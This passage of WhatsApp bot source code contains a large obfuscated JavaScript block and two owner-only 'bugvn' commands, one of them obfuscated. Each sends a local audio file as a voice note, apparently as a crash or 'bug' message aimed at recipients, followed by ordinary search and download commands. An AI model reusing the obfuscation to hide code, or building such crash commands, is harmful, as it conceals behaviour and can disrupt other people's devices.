_0x3701ed(_0x50cb86,_0x114c74-0x1a4,_0x3a750c-0x194,_0x5ea698-0x10e,_0x32a461-0x52b);}function _0x158309(_0x56b1e5,_0x4235f3,_0x9c6556,_0x33b3e3,_0x42bebb){return _0x422d10(_0x56b1e5-0x74,_0x4235f3-0x64,_0x42bebb- -0x30e,_0x33b3e3-0x143,_0x4235f3);}function _0x4a4188(_0x55d3c4,_0x4507c0,_0x39f122,_0x215fa2,_0x2fd4d2){return _0x3701ed(_0x39f122,_0x4507c0-0x1cf,_0x39f122-0x1a9,_0x215fa2-0x1ae,_0x4507c0-0x5b0);}var _0x440391={'uxerS':function(_0x5e7ef8,_0x216c8b){return _0x5e7ef8===_0x216c8b;},'rZRYU':_0x38b53b(0x3b6,0x455,'WNZ1',0x32e,0x2f7),'bqufR':_0x4a4188(0x3cd,0x405,'9Uvk',0x4db,0x4d9)+_0x38b53b(0x3eb,0x480,'5IKF',0x372,0x399)+_0x158309(-0x1ba,'1Dr#',-0x224,-0x2e0,-0x203)+')','xBRjf':_0x4a4188(0x4a8,0x3fb,'c@96',0x473,0x3d9)+_0x2c3108('R@fs',0x27e,0x336,0x403,0x337)+_0x38b53b(0x2eb,0x213,'MNjc',0x356,0x2b2)+_0x3d1dc9(-0x1fb,-0x274,'7l&p',-0x18f,-0x249)+_0x38b53b(0x2a9,0x28b,'V04q',0x33a,0x260)+_0x38b53b(0x228,0x1c5,'cl26',0x2fe,0x2dd)+_0x2c3108('efJ!',0x308,0x3c8,0x358,0x322),'rwCXO':function(_0x30907d,_0x941fa3){return _0x30907d(_0x941fa3);},'YLJcI':_0x38b53b(0x2ed,0x384,'eNfa',0x21e,0x341),'UyhMY':function(_0x1237ae,_0x462667){return _0x1237ae+_0x462667;},'YtXtC':_0x4a4188(0x378,0x2ad,'EcEG',0x1e0,0x23f),'jdoMq':function(_0x2daee4,_0x46c5de){return _0x2daee4+_0x46c5de;},'vzVRz':_0x2c3108('vWx)',0x38e,0x2c5,0x42f,0x390),'siLHs':function(_0x39aa31){return _0x39aa31();},'HItyz':_0x38b53b(0x307,0x311,'2]L2',0x29f,0x253)+_0x3d1dc9(-0xa4,-0x1bf,'EcEG',-0x16a,-0x91)+_0x2c3108('9Uvk',0x297,0x3d2,0x2d2,0x33a)+_0x158309(-0x2ad,'jP[l',-0x2c2,-0x171,-0x210),'BgjjC':_0x2c3108('8(Vi',0x2d6,0x381,0x2c0,0x36b)+_0x158309(-0x141,'eNfa',-0x21b,-0x229,-0x199)+_0x158309(-0x214,'5(Cn',-0x22e,-0x1a0,-0x1ad)+_0x38b53b(0x3bb,0x346,'V04q',0x385,0x3dc)+_0x4a4188(0x48a,0x3a8,'X&zU',0x392,0x3a6)+_0x4a4188(0x2c4,0x323,'m8OQ',0x3b4,0x2aa)+'\x20)','bncdE':function(_0x320e91){return _0x320e91();},'ojhaT':function(_0x1352a7,_0x4f4187){return _0x1352a7!==_0x4f4187;},'xPNZa':_0x158309(-0x2ed,'7l&p',-0x216,-0x23d,-0x2c2),'bawVL':_0x2c3108('3pj$',0x1be,0x21b,0x2a5,0x280),'xlvrC':function(_0x5eb53a,_0xfc6e9e){return _0x5eb53a(_0xfc6e9e);},'rUNyZ':_0x158309(-0x291,'7l&p',-0x2a7,-0x240,-0x26c),'qOolN':_0x2c3108('Uham',0x41d,0x2f7,0x373,0x3a2)+'g','rnxiB':function(_0x9b59c2,_0x8f5f20){return _0x9b59c2===_0x8f5f20;},'PcPFH':_0x38b53b(0x341,0x381,'0IIg',0x303,0x328),'kyfTd':_0x2c3108('B%)T',0x28d,0x2b9,0x242,0x241),'CKDUU':_0x3d1dc9(-0x21d,-0x9d,'GHx@',-0x16e,-0xe5)+_0x158309(-0x3f2,'0IIg',-0x27b,-0x349,-0x326)+_0x2c3108('0IIg',0x2b8,0x43d,0x421,0x36e),'QPkkD':_0x38b53b(0x3cb,0x4a3,'JTrJ',0x2f5,0x4a5)+'er','soexW':_0x2c3108('JTrJ',0x369,0x29d,0x3a4,0x382),'VKYnF':_0x2c3108('iT]D',0x22b,0x313,0x2ff,0x285),'Hopvj':function(_0x13c93c,_0x366dd8){return _0x13c93c!==_0x366dd8;},'ehwOM':function(_0x3cd7ff,_0x539ee8){return _0x3cd7ff+_0x539ee8;},'PSGyn':function(_0x4a4e4e,_0x5f106c){return _0x4a4e4e/_0x5f106c;},'kVXBC':_0x2c3108('7l&p',0x278,0x340,0x2d7,0x2ef)+'h','CDuaM':function(_0x2e7613,_0x39a47){return _0x2e7613===_0x39a47;},'BNloF':function(_0x5c5d3a,_0x5d4ae9){return _0x5c5d3a%_0x5d4ae9;},'lPoLD':_0x2c3108('EcEG',0x1cf,0x29f,0x232,0x20e),'FkiXr':_0x4a4188(0x35f,0x3d4,'LCCE',0x307,0x414),'xIjWI':_0x4a4188(0x425,0x3f7,'6fIz',0x349,0x4c8),'KmZar':_0x38b53b(0x3ab,0x395,'zEwY',0x3b6,0x3dd),'foyyq':_0x38b53b(0x246,0x1d2,'eNfa',0x1ea,0x281)+'n','TgtqT':function(_0x164095,_0x1b884b){return _0x164095!==_0x1b884b;},'Ujbfw':_0x2c3108('R@fs',0x284,0x3af,0x3ac,0x2e3),'GNbei':_0x3d1dc9(-0x11b,-0x52,'fb1k',-0x40,0x36),'yWnAg':function(_0x3c243b,_0x3eb071){return _0x3c243b+_0x3eb071;},'fNmlD':_0x2c3108('I4tG',0x2b6,0x217,0x2f6,0x2bb)+_0x3d1dc9(-0xe2,-0x10,')Qm@',-0xb2,-0x49)+'t','rnOwN':function(_0x119be8,_0x329886){return _0x119be8(_0x329886);},'awhRw':_0x38b53b(0x386,0x389,'cl26',0x2fe,0x2ee)+_0x3d1dc9(-0x1f2,-0xc2,'Tc1*',-0x117,-0x87)+'2','SvfiZ':function(_0xdbfef){return _0xdbfef();},'XnFgF':_0x3d1dc9(-0x35,-0x149,'8(Vi',-0x91,0x54),'UMiFG':function(_0x44d2ef,_0x243bd9){return _0x44d2ef!==_0x243bd9;},'wdOyf':_0x3d1dc9(-0xc3,-0x21f,'2]L2',-0x190,-0x24b),'RwtkK':_0x2c3108('1Dr#',0x336,0x360,0x30c,0x2b8),'svisA':function(_0x5d9bc5,_0x6ef079){return _0x5d9bc5!==_0x6ef079;},'mQBvh':_0x4a4188(0x342,0x2f7,'iT]D',0x286,0x2a3)};function _0x4bda6b(_0x437be6){function _0x3fc4e8(_0x3e3dec,_0xe9db65,_0x46ba62,_0x2c558d,_0x551926){return _0x4a4188(_0x3e3dec-0x4d,_0xe9db65- -0x410,_0x3e3dec,_0x2c558d-0x1b1,_0x551926-0x1db);}function _0x2a72b3(_0x42ade5,_0x198c81,_0x597ba3,_0x3729fa,_0x4b5709){return _0x2c3108(_0x4b5709,_0x198c81-0x191,_0x597ba3-0x6d,_0x3729fa-0xa0,_0x597ba3-0x11);}function _0x350b71(_0x5bc50c,_0x4d373b,_0x19ed34,_0x527bd8,_0x376872){return _0x3d1dc9(_0x5bc50c-0x112,_0x4d373b-0x183,_0x4d373b,_0x376872-0x181,_0x376872-0x104);}function _0x46f5d8(_0x5af7c8,_0x13eb08,_0x147564,_0x43560c,_0x418243){return _0x158309(_0x5af7c8-0x108,_0x5af7c8,_0x147564-0x154,_0x43560c-0xa3,_0x418243-0x50a);}function _0x1c6183(_0x45ebd2,_0xe374d0,_0x523f05,_0x53c891,_0x55413f){return _0x158309(_0x45ebd2-0xcb,_0x523f05,_0x523f05-0xe0,_0x53c891-0x78,_0xe374d0-0x533);}var _0x608192={'tOrCj':_0x440391[_0x1c6183(0x38d,0x2c8,'R@fs',0x26d,0x2d7)],'GUuHF':_0x440391[_0x2a72b3(0x285,0x192,0x221,0x19d,'@zYO')],'DDWjL':function(_0x776631,_0x44c4b9){function _0x5c5662(_0x1ea053,_0x13325b,_0x4e9c0c,_0x561945,_0x53a937){return _0x1c6183(_0x1ea053-0x36,_0x4e9c0c- -0x1c2,_0x13325b,_0x561945-0x77,_0x53a937-0x192);}return _0x440391[_0x5c5662(0x130,'5IKF',0x61,-0x7e,-0x16)](_0x776631,_0x44c4b9);},'ksRjS':_0x440391[_0x2a72b3(0x1f0,0x2b1,0x2aa,0x2d7,'C3lK')],'ZqPSK':function(_0x5ea211,_0x1875e9){function _0x133ace(_0x4a0fd0,_0x391026,_0x29f68a,_0x479697,_0x113d7e){return _0x2a72b3(_0x4a0fd0-0x2d,_0x391026-0xa9,_0x479697- -0x339,_0x479697-0xba,_0x29f68a);}return _0x440391[_0x133ace(0xde,0x17,'7l&p',0x90,0xff)](_0x5ea211,_0x1875e9);},'BIqPt':_0x440391[_0x350b71(0x113,'GHx@',0xbb,0x7e,0x136)],'uZYZw':function(_0x4d8428,_0x291a1d){function _0x385022(_0x39b417,_0x82b65a,_0x36c54a,_0x2a8c64,_0x31bedd){return _0x350b71(_0x39b417-0x1b8,_0x36c54a,_0x36c54a-0x115,_0x2a8c64-0x56,_0x2a8c64- -0x72);}return _0x440391[_0x385022(0x7e,-0x1d,'V04q',0x3c,-0xa)](_0x4d8428,_0x291a1d);},'quBvZ':_0x440391[_0x3fc4e8('cl26',-0x181,-0xd4,-0xcc,-0x20d)],'kuehC':function(_0x410121,_0x42ba){function _0x40da02(_0x2906cb,_0x4512ea,_0x3883b8,_0x1a4453,_0x34d046){return _0x3fc4e8(_0x1a4453,_0x34d046- -0xd3,_0x3883b8-0xe8,_0x1a4453-0x11a,_0x34d046-0xea);}return _0x440391[_0x40da02(-0x1e9,-0xbc,-0x13d,'Uham',-0x126)](_0x410121,_0x42ba);},'vGScK':function(_0x5311e0){function _0x4454c3(_0x16567f,_0x48bcd9,_0x3a1c41,_0x102c5f,_0xab7e61){return _0x2a72b3(_0x16567f-0x199,_0x48bcd9-0x9b,_0x16567f- -0x330,_0x102c5f-0x9a,_0x3a1c41);}return _0x440391[_0x4454c3(-0x40,-0x37,'B%)T',0x99,0x40)](_0x5311e0);},'AbHKB':function(_0x4d074f,_0x5189aa){function _0x4ea2ad(_0x114edd,_0x1d0512,_0x2ad822,_0x271855,_0x351964){return _0x350b71(_0x114edd-0x17f,_0x2ad822,_0x2ad822-0x97,_0x271855-0x81,_0x1d0512- -0x18a);}return _0x440391[_0x4ea2ad(0xac,-0xd,'GHx@',-0xe3,-0x64)](_0x4d074f,_0x5189aa);},'mgiBA':_0x440391[_0x1c6183(0x266,0x25b,'WNZ1',0x2ac,0x1b8)],'yqbIc':_0x440391[_0x350b71(0x10a,'I4tG',-0x3c,0xcd,0x26)],'yzUKq':function(_0x6deeec){function _0x5b2eca(_0x1cdbfe,_0x2b521a,_0x33a213,_0x669fb6,_0x50a001){return _0x3fc4e8(_0x33a213,_0x669fb6-0x590,_0x33a213-0x11c,_0x669fb6-0x189,_0x50a001-0xd1);}return _0x440391[_0x5b2eca(0x4d1,0x5b0,'lR]Z',0x58a,0x4d4)](_0x6deeec);},'wkDBP':function(_0x84fa5,_0x3c4c02){function _0x44ddbc(_0x4409d7,_0x5bace1,_0xeb539,_0x474302,_0x2751a6){return _0x350b71(_0x4409d7-0x9,_0x4409d7,_0xeb539-0x186,_0x474302-0xf1,_0x5bace1- -0x276);}return _0x440391[_0x44ddbc('8(Vi',-0x24a,-0x206,-0x27d,-0x2be)](_0x84fa5,_0x3c4c02);},'bgubJ':_0x440391[_0x3fc4e8(')Qm@',-0x97,-0x52,-0x3c,-0xcb)],'oVOme':_0x440391[_0x350b71(0x49,'I4tG',0xc0,0x183,0x114)],'wXepp':function(_0x505460,_0x5ab1ae){function _0x9c7f35(_0x4753b2,_0x5f26e3,_0x18cd76,_0x353be4,_0x1e6106){return _0x3fc4e8(_0x5f26e3,_0x18cd76-0xf,_0x18cd76-0x1a8,_0x353be4-0x182,_0x1e6106-0x115);}return _0x440391[_0x9c7f35(-0xcb,'MNjc',-0x74,-0x68,-0x57)](_0x505460,_0x5ab1ae);}};if(_0x440391[_0x3fc4e8('p[8q',-0x11a,-0x1ae,-0x1bd,-0x3b)](_0x440391[_0x350b71(-0xe9,'m8OQ',-0x108,-0x97,-0x2f)],_0x440391[_0x350b71(-0x23,'MNjc',0x7e,0x25,0x69)])){if(_0x440391[_0x2a72b3(0x46b,0x318,0x3c4,0x352,'cl26')](typeof _0x437be6,_0x440391[_0x2a72b3(0x43f,0x421,0x3c8,0x2fe,'V04q')])){if(_0x440391[_0x3fc4e8('m8OQ',-0x1a,-0x1b,-0x1c,-0xc4)](_0x440391[_0x3fc4e8('LCCE',-0xc,-0xdf,0xa9,0x24)],_0x440391[_0x46f5d8('eNfa',0x351,0x3c7,0x388,0x337)])){var _0x36f154=new _0x4015d5(_0x608192[_0x2a72b3(0x375,0x31b,0x2b9,0x26f,'WNZ1')]),_0x1e17c6=new _0x2c09e7(_0x608192[_0x2a72b3(0x288,0x447,0x36c,0x379,'fb1k')],'i'),_0x48700f=_0x608192[_0x1c6183(0x388,0x30c,'V04q',0x30d,0x3d9)](_0xbf2b3a,_0x608192[_0x3fc4e8('3FsK',-0x39,-0x77,-0x39,0x7e)]);!_0x36f154[_0x2a72b3(0x341,0x245,0x2e1,0x2ad,'VMEc')](_0x608192[_0x46f5d8('9Uvk',0x219,0x2a6,0x120,0x1e9)](_0x48700f,_0x608192[_0x1c6183(0x361,0x385,'VMEc',0x412,0x37d)]))||!_0x1e17c6[_0x46f5d8('lR]Z',0x285,0x27a,0x341,0x2de)](_0x608192[_0x1c6183(0x46d,0x391,')Qm@',0x3d0,0x2d8)](_0x48700f,_0x608192[_0x1c6183(0x265,0x337,'WNZ1',0x32b,0x324)]))?_0x608192[_0x3fc4e8('EcEG',0x37,0xfd,-0x26,-0xa7)](_0x48700f,'0'):_0x608192[_0x46f5d8('6fIz',0x359,0x217,0x1e8,0x2a9)](_0x3066fc);}else return function(_0x4816d3){}[_0x1c6183(0x1ea,0x200,'$gz[',0x208,0x25f)+_0x3fc4e8('@zYO',-0x135,-0x1b5,-0x15b,-0x1f9)+'r'](_0x440391[_0x2a72b3(0x3c7,0x2f7,0x33a,0x348,'0IIg')])[_0x2a72b3(0x303,0x364,0x2a6,0x305,'LCCE')](_0x440391[_0x1c6183(0x2ab,0x227,'iT]D',0x179,0x291)]);}else{if(_0x440391[_0x350b71(0xde,'VMEc',0xb,0x74,0x3)](_0x440391[_0x46f5d8('$i)3',0x2cf,0x301,0x35a,0x2cb)],_0x440391[_0x1c6183(0x3dc,0x384,'X&zU',0x3de,0x2c2)])){if(_0x440391[_0x46f5d8('5(Cn',0x15c,0x16e,0x21a,0x20d)](_0x440391[_0x1c6183(0x389,0x318,'dyA0',0x264,0x25a)]('',_0x440391[_0x1c6183(0x26e,0x1fc,'f$Lq',0x180,0x225)](_0x437be6,_0x437be6))[_0x440391[_0x350b71(0x157,'LCCE',0xaf,-0x4a,0x95)]],0x2*0xe64+-0x12b+0x6e7*-0x4)||_0x440391[_0x350b71(0x1d,'p[8q',0x6e,-0x2d,0x8f)](_0x440391[_0x350b71(-0xa9,'GHx@',0x88,-0xe3,-0x27)](_0x437be6,-0x2*0xf41+0x2003+-0x16d),-0x1250+0xa17+0x839)){if(_0x440391[_0x3fc4e8('3FsK',-0x8f,-0xdd,0xd,-0x2d)](_0x440391[_0x1c6183(0x309,0x2e1,'jP[l',0x36a,0x34a)],_0x440391[_0x350b71(0x1e7,'9Uvk',0x94,0x1d0,0x164)])){var _0x1c1713=_0x28ca80?function(){function _0x51fc38(_0x25c67b,_0x462e46,_0xf7009d,_0x5d8141,_0x466048){return _0x350b71(_0x25c67b-0xfa,_0x5d8141,_0xf7009d-0x184,_0x5d8141-0x1a0,_0x466048-0x494);}if(_0x5c125d){var _0x4f38ef=_0x5e9be9[_0x51fc38(0x62b,0x62e,0x61f,'EcEG',0x5b0)](_0x1e3566,arguments);return _0x48e406=null,_0x4f38ef;}}:function(){};return _0x59a30b=![],_0x1c1713;}else(function(){function _0x23ee5c(_0x597e97,_0x224466,_0x1e9f61,_0x533dd7,_0x31049c){return _0x350b71(_0x597e97-0x11c,_0x224466,_0x1e9f61-0xa2,_0x533dd7-0xca,_0x1e9f61- -0x2ae);}function _0x715035(_0x34f6af,_0x45262b,_0x48f813,_0x2df8a0,_0x16f64a){return _0x350b71(_0x34f6af-0xdb,_0x34f6af,_0x48f813-0x9a,_0x2df8a0-0x6f,_0x16f64a-0x358);}function _0x48309e(_0x28c133,_0x48ea27,_0x5f27a5,_0xa6f824,_0xcecc52){return _0x350b71(_0x28c133-0x14f,_0x28c133,_0x5f27a5-0x14e,_0xa6f824-0x186,_0x48ea27-0xb0);}function _0x4e9bab(_0x48ad73,_0x6aeb85,_0x30b854,_0x46eca1,_0x312df3){return _0x2a72b3(_0x48ad73-0x32,_0x6aeb85-0x82,_0x48ad73- -0x4c8,_0x46eca1-0x2a,_0x30b854);}function _0x1be47d(_0x2c4ba8,_0x1fa19a,_0xf658a4,_0x2ecaab,_0x304bd6){return _0x2a72b3(_0x2c4ba8-0x198,_0x1fa19a-0x66,_0xf658a4- -0x1d4,_0x2ecaab-0xa5,_0x1fa19a);}if(_0x608192[_0x715035('zEwY',0x2de,0x31a,0x303,0x3ac)](_0x608192[_0x1be47d(0x102,'eNfa',0x75,0xd4,-0x6f)],_0x608192[_0x715035('MNjc',0x364,0x406,0x3d3,0x38d)]))return!![];else{var _0x4e787c=_0x608192[_0x48309e('jP[l',0x1ce,0x236,0xe9,0x16d)](_0x2d3b1f,_0x608192[_0x1be47d(0x207,'EcEG',0x1ee,0x119,0x2a5)](_0x608192[_0x1be47d(0x29d,'6fIz',0x1e7,0x101,0x12b)](_0x608192[_0x4e9bab(-0x273,-0x349,'efJ!',-0x2a4,-0x201)],_0x608192[_0x1be47d(0x96,'zEwY',0x11e,0xa0,0x1bb)]),');'));_0x1ab41a=_0x608192[_0x23ee5c(-0x234,'@dp[',-0x2ad,-0x30f,-0x2a7)](_0x4e787c);}}[_0x1c6183(0x356,0x2f2,')Qm@',0x24f,0x2e2)+_0x3fc4e8('iT]D',-0x32,-0x107,0x45,0x34)+'r'](_0x440391[_0x350b71(-0x1f,'jP[l',0x133,0x17c,0x98)](_0x440391[_0x350b71(0x22a,'efJ!',0x99,0xb3,0x163)],_0x440391[_0x350b71(0xc,'3FsK',-0x100,0x7f,-0x3c)]))[_0x1c6183(0x310,0x338,'i8[p',0x2c6,0x375)](_0x440391[_0x350b71(-0xce,'tY@b',-0x8f,-0x8f,-0x37)]));}else{if(_0x440391[_0x350b71(0x59,'p[8q',0x4,-0xb6,0x2d)](_0x440391[_0x1c6183(0x252,0x2d5,'vWx)',0x28b,0x26e)],_0x440391[_0x1c6183(0x1af,0x213,'@zYO',0x1fb,0x1d5)]))(function(){function _0x297fd4(_0x476380,_0x2b349c,_0x1702ec,_0x119c84,_0x5458b2){return _0x1c6183(_0x476380-0x198,_0x2b349c- -0x350,_0x5458b2,_0x119c84-0xa5,_0x5458b2-0x1e8);}function _0x31ec35(_0x1ca80d,_0x3641c6,_0x1ebf4e,_0x4efa58,_0x4e8b26){return _0x3fc4e8(_0x4efa58,_0x1ebf4e-0x3,_0x1ebf4e-0xe2,_0x4efa58-0x1a5,_0x4e8b26-0x84);}function _0xf82d32(_0x2e79d7,_0x2f71de,_0x4ec7a5,_0x26db99,_0x1d7e09){return _0x46f5d8(_0x2e79d7,_0x2f71de-0x52,_0x4ec7a5-0xaf,_0x26db99-0xca,_0x2f71de-0x132);}if(_0x440391[_0x31ec35(-0x1d1,-0x138,-0x14f,'@zYO',-0x10f)](_0x440391[_0x297fd4(-0x182,-0xc9,-0x61,-0x43,'C3lK')],_0x440391[_0xf82d32(')Qm@',0x4cc,0x552,0x47a,0x533)]))return![];else{var _0x1982a8=_0x5d5fbb?function(){function _0x57a23f(_0x177634,_0x2e6c1a,_0x2a40e6,_0x2a91f5,_0x26be51){return _0x31ec35(_0x177634-0x10,_0x2e6c1a-0x18d,_0x2e6c1a-0x37a,_0x2a40e6,_0x26be51-0x7e);}if(_0x5b27c9){var _0x4f4041=_0x5e5a65[_0x57a23f(0x34f,0x27e,'Tc1*',0x25e,0x1a6)](_0x47a6ec,arguments);return _0x17fbf8=null,_0x4f4041;}}:function(){};return _0x46a52c=![],_0x1982a8;}}[_0x1c6183(0x328,0x25a,'VMEc',0x340,0x2b0)+_0x46f5d8('V04q',0x2a0,0x3de,0x3b6,0x351)+'r'](_0x440391[_0x3fc4e8('@dp[',-0x137,-0x160,-0x14f,-0x94)](_0x440391[_0x2a72b3(0x2da,0x20f,0x285,0x323,'JTrJ')],_0x440391[_0x3fc4e8('EcEG',-0x41,-0x20,-0x119,-0xc2)]))[_0x3fc4e8('f$Lq',-0x4e,0x1,-0x4d,-0x34)](_0x440391[_0x350b71(0x25a,'Tc1*',0x1fa,0x16e,0x186)]));else{if(_0x4cdf73){var _0x256f6e=_0x54c673[_0x46f5d8('X&zU',0x2dd,0x248,0x3ae,0x2f4)](_0x46358d,arguments);return _0x59b37a=null,_0x256f6e;}}}}else{var _0x4856ca=_0x43494f[_0x3fc4e8(')Qm@',-0xc7,-0x9a,-0x177,-0x176)](_0x5018ec,arguments);return _0x5b7b9f=null,_0x4856ca;}}_0x440391[_0x350b71(0x51,'EcEG',0xf5,0x10a,0xeb)](_0x4bda6b,++_0x437be6);}else{if(_0x96c6e7)return _0x2131df;else _0x608192[_0x350b71(0x98,'3pj$',0x1c8,0x16d,0xe4)](_0x25facd,-0x1*-0x863+-0x1*-0x1970+-0x21d3);}}function _0x38b53b(_0x9f090f,_0x267595,_0x120c49,_0x560168,_0x433a47){return _0x452ea8(_0x9f090f-0x41a,_0x267595-0x2a,_0x120c49,_0x560168-0xe1,_0x433a47-0x1af);}function _0x3d1dc9(_0x85b81d,_0x2cb2fd,_0xa1657d,_0x37f5f7,_0x47b3dc){return _0x3701ed(_0xa1657d,_0x2cb2fd-0x14a,_0xa1657d-0x44,_0x37f5f7-0xb5,_0x37f5f7-0x168);}try{if(_0x440391[_0x38b53b(0x352,0x2ef,'tY@b',0x369,0x2aa)](_0x440391[_0x4a4188(0x2b1,0x30b,'I4tG',0x250,0x2b2)],_0x440391[_0x158309(-0x153,'3pj$',-0x222,-0x1b0,-0x22e)])){if(_0x234c44){if(_0x440391[_0x3d1dc9(0x82,0x4e,'I4tG',-0x28,-0x2)](_0x440391[_0x3d1dc9(-0x47,-0x8,'JTrJ',-0xd1,-0x21)],_0x440391[_0x4a4188(0x3c9,0x3a5,'MNjc',0x3a3,0x445)]))return _0x4bda6b;else{var _0x2acf0f=_0x440391[_0x158309(-0x37f,')Qm@',-0x2d5,-0x2e8,-0x2d6)][_0x3d1dc9(-0xc4,-0x85,'hIiQ',-0xc0,-0x193)]('|'),_0x150bb9=-0x29*0xc7+0x1*0x117f+0xe6*0x10;while(!![]){switch(_0x2acf0f[_0x150bb9++]){case'0':var _0x1acec6=_0xc6292e[_0x4dc6eb]||_0x3e5883;continue;case'1':_0x3e5883[_0x38b53b(0x229,0x163,'$gz[',0x17f,0x206)+_0x158309(-0x1dc,'6fIz',-0x151,-0x1c4,-0x1f5)]=_0x1acec6[_0x4a4188(0x249,0x2bc,'p[8q',0x364,0x310)+_0x158309(-0x281,'R@fs',-0x182,-0x1d2,-0x25b)][_0x3d1dc9(-0x69,0xb7,'iT]D',-0x1a,0x63)](_0x1acec6);continue;case'2':_0xdbe2d6[_0x4dc6eb]=_0x3e5883;continue;case'3':var _0x4dc6eb=_0xaac617[_0x124f90];continue;case'4':var _0x3e5883=_0x7fd6e0[_0x2c3108('LCCE',0x343,0x263,0x28b,0x2b4)+_0x2c3108('lR]Z',0x22c,0x1c4,0x192,0x25b)+'r'][_0x2c3108('3pj$',0x2d0,0x1c7,0x15f,0x229)+_0x3d1dc9(-0x1ad,-0x102,'VMEc',-0x13a,-0x1d7)][_0x4a4188(0x3f1,0x367,'6fIz',0x30f,0x448)](_0x3c41dd);continue;case'5':_0x3e5883[_0x3d1dc9(-0x46,-0x72,'vWx)',-0x64,-0x21)+_0x38b53b(0x2bb,0x2ac,'tY@b',0x35e,0x24d)]=_0x5bc7b8[_0x4a4188(0x42d,0x41c,'JTrJ',0x490,0x49c)](_0x40c224);continue;}break;}}}else _0x440391[_0x38b53b(0x29a,0x2f6,'3FsK',0x1f5,0x1d2)](_0x440391[_0x4a4188(0x29f,0x37f,'VMEc',0x2c7,0x343)],_0x440391[_0x2c3108('R@fs',0x408,0x410,0x330,0x32b)])?_0x440391[_0x3d1dc9(0x30,0xf,'3FsK',-0x2f,0x3e)](_0x255b72):_0x440391[_0x4a4188(0x2e5,0x315,'0IIg',0x337,0x23f)](_0x4bda6b,0x7a3*-0x2+0x2*0xc36+-0x926);}else _0x440391[_0x4a4188(0x371,0x2c7,'iT]D',0x2b5,0x23c)](_0x21453e);}catch(_0x3dc2ee){}}break
case 'bugvn2':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
function _0x338f(_0x486d91,_0x18fa14){var _0x26fb6d=_0x26fb();return _0x338f=function(_0x338f2c,_0x1eb184){_0x338f2c=_0x338f2c-0x1da;var _0x1f1e5d=_0x26fb6d[_0x338f2c];return _0x1f1e5d;},_0x338f(_0x486d91,_0x18fa14);}var _0x300f97=_0x338f;(function(_0x422de3,_0x188ec0){var _0x4a7096=_0x338f,_0x1dd4b1=_0x422de3();while(!![]){try{var _0x528420=parseInt(_0x4a7096(0x1e8))/0x1*(parseInt(_0x4a7096(0x1e4))/0x2)+-parseInt(_0x4a7096(0x1e7))/0x3*(parseInt(_0x4a7096(0x1e5))/0x4)+parseInt(_0x4a7096(0x1ea))/0x5*(parseInt(_0x4a7096(0x1e9))/0x6)+parseInt(_0x4a7096(0x1e6))/0x7*(parseInt(_0x4a7096(0x1db))/0x8)+-parseInt(_0x4a7096(0x1eb))/0x9*(-parseInt(_0x4a7096(0x1de))/0xa)+parseInt(_0x4a7096(0x1e3))/0xb*(-parseInt(_0x4a7096(0x1da))/0xc)+parseInt(_0x4a7096(0x1df))/0xd*(parseInt(_0x4a7096(0x1e1))/0xe);if(_0x528420===_0x188ec0)break;else _0x1dd4b1['push'](_0x1dd4b1['shift']());}catch(_0x55b225){_0x1dd4b1['push'](_0x1dd4b1['shift']());}}}(_0x26fb,0xdc845));function _0x26fb(){var _0x515900=['602378aZQzLh','audio/mp4','22UPUacm','2mzySco','4EJaqZE','7IfeDbC','2669133JcokOu','326479dYgSxJ','1607094uzcJGO','5OnQemn','37719hAJEtW','sendMessage','4199676NINBuG','7112856ulfLeH','fromMe','./media/help.mp3','150jntLeA','286TRGadN','audio'];_0x26fb=function(){return _0x515900;};return _0x26fb();}if(mek['key'][_0x300f97(0x1dc)]&&!isOwner)return;sssss=fs['readFileSync'](_0x300f97(0x1dd)),bosco[_0x300f97(0x1ec)](from,sssss,MessageType[_0x300f97(0x1e0)],{'quoted':mek,'mimetype':_0x300f97(0x1e2),'ptt':!![]});break
case 'bugvn3':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (mek.key.fromMe && !isOwner) return
sssssss = fs.readFileSync('./media/date.mp3')
bosco.sendMessage(from, sssssss, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break
       case 'ghsearch': 
       case 'githubsearch': 
       case 'gs':
             if (!q) return reply('*What are you looking for?*')
             res = await fetch('https://api.github.com/search/repositories?q='+q)
             json = await res.json()
             if (res.status !== 200) throw json
             str = json.items.map((repo, index) => {
             return `
${1 + index}. *${repo.full_name}*${repo.fork ? ' (fork)' : ''}
${repo.html_url}
Made on *${formatDate(repo.created_at)}*
Last updated on *${formatDate(repo.updated_at)}*
👁  ${repo.watchers}   🍴  ${repo.forks}   ⭐  ${repo.stargazers_count}
${repo.open_issues} Issue${repo.description ? `
*Description:*\n${repo.description}` : ''}
*Clone:* *$ git clone ${repo.clone_url}*
`.trim()
}).join('\n\n')
            reply(str)
            break
     case 'image':
     case 'gimage':
     case 'googleimage':
              if (args.length < 1) return reply('*What do you want to search?*')
              reply(mess.wait)
              teks = args.join(' ')
              res = await _gis(teks, google)
              function google(error, result){
              if (error){ return reply('*Error An Error Occurs Or No Result Found*')}
              else {
              gugIm = result
              random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
              sendFileFromUrl(random, image, {quoted: mek, thumbnail: Buffer.alloc(0), caption: `*Search Results From :* ${teks}`})
              }
              }
             break
      case 'youtubedl':
      case 'ytmp3':
      case 'ytmp4':
      case 'video':
             if (args.length < 1) return reply('*Where is the link?*')
             if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
             teks = args.join(' ')
             res = await y2mateA(teks).catch(e => {
             reply('*Error Failed To Enter Y2mate Web*')
})
             result = `
*Tɪᴛʟᴇ :* ${res[0].judul}
*Tʏᴘᴇ :* mp3/mp4
*Sɪᴢᴇ :* ${res[0].size}`
              buttons = [{buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `ᴍᴘ4`},type:1},{buttonId:`${prefix}buttons1 ${q}`,buttonText:{displayText:'ᴍᴘ3'},type:1}]
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
              yt1 = await bosco.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), location, {thumbnail: fs.readFileSync(`./ytmp.jpeg`),})
              yt2 = yt1.message["ephemeralMessage"] ? yt1.message.ephemeralMessage : yt1
              buttonsMessage = {footerText:`${result}`,
              contentText:` `,buttons,headerType:6, locationMessage: yt2.message.locationMessage}
              prep = await bosco.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
              bosco.relayWAMessage(prep)
              fs.unlinkSync(`./ytmp.jpeg`)
              break
      case 'tiktokdl':
              if (!q) return reply('The link?')
              if (!q.includes('tiktok')) return reply(mess.error.Iv)
